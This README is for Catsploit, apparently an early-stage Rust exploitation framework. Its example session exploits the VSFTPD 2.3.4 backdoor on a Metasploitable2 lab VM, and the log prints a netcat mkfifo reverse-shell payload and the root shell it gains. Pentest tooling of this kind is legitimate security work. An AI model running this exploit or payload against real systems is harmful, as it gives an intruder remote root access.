# Catsploit
Catsploit is an open-source modern exploitation framework.  

Catsploit is currently in early development and the project is aiming to attract contributors who are interested in building the next generation exploitation framework in Rust.  

## Install
To install as a crate: `cargo install catsploit`

To build from source:

```
git clone https://github.com/tirax-lab/catsploit
cd catsploit/catsploit
cargo build --release
sudo cp ./target/release/catsploit /usr/local/bin
```

## Example Usage - Exploiting an VSFTPD v2.3.4 backdoor
In this exploitation a virtual machine with Metasploitable2 is running at `172.16.187.128`, which has a vulnerable `VSFTPD` server running:

- The default reverse shell nc_mkfifo_reverse_tcp payload has its `LHOST` set to `172.16.1.1` which is where VMware routes back to the host machine
- The VSFTPD exploit has its `RHOST` set to `172.16.187.128` and the default `RPORT` is `21` for the FTP server
- When `run` is called, the exploit runs and the payload runs a pretask which starts a listening TCP server for the shell connection
- The exploit is successful and the payload executes on the Metasploitable2 system, the listening TCP server receives a connection and a root shell is opened

```
*[dev][~/dev/default/tirax_lab/catsploit/catsploit]$ c run
    Finished dev [unoptimized + debuginfo] target(s) in 0.02s
     Running `target/debug/catsploit`

 ________  ________  _________  ________  ________  ___       ________  ___  _________
|\   ____\|\   __  \|\___   ___\\   ____\|\   __  \|\  \     |\   __  \|\  \|\___   ___\
\ \  \___|\ \  \|\  \|___ \  \_\ \  \___|\ \  \|\  \ \  \    \ \  \|\  \ \  \|___ \  \_|
 \ \  \    \ \   __  \   \ \  \ \ \_____  \ \   ____\ \  \    \ \  \\\  \ \  \   \ \  \
  \ \  \____\ \  \ \  \   \ \  \ \|____|\  \ \  \___|\ \  \____\ \  \\\  \ \  \   \ \  \
   \ \_______\ \__\ \__\   \ \__\  ____\_\  \ \__\    \ \_______\ \_______\ \__\   \ \__\
    \|_______|\|__|\|__|    \|__| |\_________\|__|     \|_______|\|_______|\|__|    \|__|
                                  \|_________|

---------------------
 Module Type  Loaded
---------------------
 Exploits     1
---------------------
 Payloads     2
---------------------
catsploit> show payloads
+---+-------------------------------------------+---------------------------+--------------+
| # | Module Path                               | Name                      | Kind         |
+---+-------------------------------------------+---------------------------+--------------+
| 0 | payload/ruby/reverse_tcp                  | Ruby Reverse TCP          | ReverseShell |
+---+-------------------------------------------+---------------------------+--------------+
| 1 | payload/linux_shell/nc_mkfifo_reverse_tcp | Netcat Mkfifo Reverse TCP | ReverseShell |
+---+-------------------------------------------+---------------------------+--------------+
catsploit> use 1
catsploit (payload/linux_shell/nc_mkfifo_reverse_tcp)> set LHOST 172.16.1.1
catsploit (payload/linux_shell/nc_mkfifo_reverse_tcp)> info
+---------------------------+-------------------------------------------+--------------+
| Name                      | Module Path                               | Kind         |
+---------------------------+-------------------------------------------+--------------+
| Netcat Mkfifo Reverse TCP | payload/linux_shell/nc_mkfifo_reverse_tcp | ReverseShell |
+---------------------------+-------------------------------------------+--------------+
+-------+---------------+---------+------------+
| Name  | Description   | Default | Current    |
+-------+---------------+---------+------------+
| LHOST | Listener host | 0.0.0.0 | 172.16.1.1 |
+-------+---------------+---------+------------+
| LPORT | Listener port | 9092    | 9092       |
+-------+---------------+---------+------------+
catsploit (payload/linux_shell/nc_mkfifo_reverse_tcp)> show exploits
+---+---------------------------------+------------------------------------------+-----------+
| # | Module Path                     | Name                                     | Ranking   |
+---+---------------------------------+------------------------------------------+-----------+
| 0 | exploit/ftp/vsftpd_234_backdoor | VSFTPD v2.3.4 Backdoor Command Execution | Excellent |
+---+---------------------------------+------------------------------------------+-----------+
catsploit (payload/linux_shell/nc_mkfifo_reverse_tcp)> use 0
catsploit (exploit/ftp/vsftpd_234_backdoor)> set RHOST 172.16.187.128
catsploit (exploit/ftp/vsftpd_234_backdoor)> info
+------------------------------------------+---------------------------------+-----------------+--------+-----------+
| Name                                     | Module Path                     | Disclosure Date | Kind   | Ranking   |
+------------------------------------------+---------------------------------+-----------------+--------+-----------+
| VSFTPD v2.3.4 Backdoor Command Execution | exploit/ftp/vsftpd_234_backdoor | 2011-07-03      | Remote | Excellent |
+------------------------------------------+---------------------------------+-----------------+--------+-----------+
+---------------+-------------------------------------------------------------------+---------+----------------+
| Name          | Description                                                       | Default | Current        |
+---------------+-------------------------------------------------------------------+---------+----------------+
| RHOST         | Remote/Target host                                                |         | 172.16.187.128 |
+---------------+-------------------------------------------------------------------+---------+----------------+
| RPORT         | Remote/Target port                                                | 21      | 21             |
+---------------+-------------------------------------------------------------------+---------+----------------+
| READ_TIMEOUT  | Seconds to wait when reading from client stream before timing out | 60      | 60             |
+---------------+-------------------------------------------------------------------+---------+----------------+
| WRITE_TIMEOUT | Seconds to wait when writing from client stream before timing out | 60      | 60             |
+---------------+-------------------------------------------------------------------+---------+----------------+
| BACKDOOR_PORT | Backdoor port that the vulnerable VSFTPD server can open          | 6200    | 6200           |
+---------------+-------------------------------------------------------------------+---------+----------------+
+------------------+---------------------------+
| Selected Payload | Netcat Mkfifo Reverse TCP |
+------------------+---------------------------+
catsploit (exploit/ftp/vsftpd_234_backdoor)> run
[2023-03-01T16:01:51Z INFO  catsploit_lib::module::exploit::ftp::vsftpd_234_backdoor] Attempting to access backdoor on port 6200
[2023-03-01T16:01:51Z INFO  catsploit_lib::module::exploit::ftp::vsftpd_234_backdoor] Port 6200 used by backdoor bind listener is not already open: Connection refused (os error 111)
[2023-03-01T16:01:51Z INFO  catsploit_lib::core::exploit::remote_tcp] Attempting connection to 172.16.187.128:21
[2023-03-01T16:01:51Z INFO  catsploit_lib::module::exploit::ftp::vsftpd_234_backdoor] Banner returned from server: 220 (vsFTPd 2.3.4)

[2023-03-01T16:01:51Z INFO  catsploit_lib::module::exploit::ftp::vsftpd_234_backdoor] Response to user hash: 331 Please specify the password.

[2023-03-01T16:01:52Z INFO  catsploit_lib::module::exploit::ftp::vsftpd_234_backdoor] Attempting to access backdoor on port 6200
[2023-03-01T16:01:52Z INFO  catsploit_lib::module::exploit::ftp::vsftpd_234_backdoor] Port 6200 used by the backdoor bind listener is open
[2023-03-01T16:01:52Z INFO  catsploit_lib::module::exploit::ftp::vsftpd_234_backdoor] Received successful backdoor UID response: uid=0(root) gid=0(root)
[2023-03-01T16:01:52Z INFO  catsploit_lib::core::handler::generic_tcp_handler] Listening for one connection on: 0.0.0.0:9092
[2023-03-01T16:01:52Z INFO  catsploit_lib::module::exploit::ftp::vsftpd_234_backdoor] Writing payload to backdoor stream: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.1.1 9092 >/tmp/f
[2023-03-01T16:01:52Z INFO  catsploit_lib::core::handler::generic_tcp_handler] Received handler connection from: 172.16.1.1:46065
> whoami
sh: no job control in this shell
root
> ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
>
```

## TODO

- Module Types, catsploit currently has exploit and payload module types defined. Auxiliary, Evasion, Encoder, and many other module types should be created
- More modules, more exploits, payloads and others written so that catsploit becomes usable in a general pentest
- Better documentation for new users, tutorials, videos, etc.

## Automated Testing
Some points on automated testing within Catsploit:

- Tests are written for logical functionality. For example in `catsploit_lib/src/core/exploit/remote_tcp.rs`, tests are written for the both `connect` and `custom_connect` but not for `opts`. A test could be written for `opts` that iterates through the values looking for `RHOST` etc., but this makes the changing the `opts` function more involved for not much benefit
- Tests are not written for functions that only print to STDOUT with no side effects. Example being `print_exploit` in `catsploit/src/cli/info.rs`
- It's fine to modify a functions parameters and code block solely to make it more testable. For example `show_exploits` in `catsploit/src/cli/cmd/show.rs` takes a boolean indicating if the function is running in a test or not, to prevent it from printing the full exploit table to STDOUT during tests. There may be possible ways to block the STDOUT printing in the tests using closures etc., that wouldn't need to modify the `show_exploits` function signature. The added complexity and development time for that isn't worth it to avoid a simple parameter change.

### Running Tests
To run tests for both the catsploit library and the CLI application:

```
cargo test --manifest-path=catsploit_lib/Cargo.toml && cargo test --manifest-path=catsploit/Cargo.toml
```
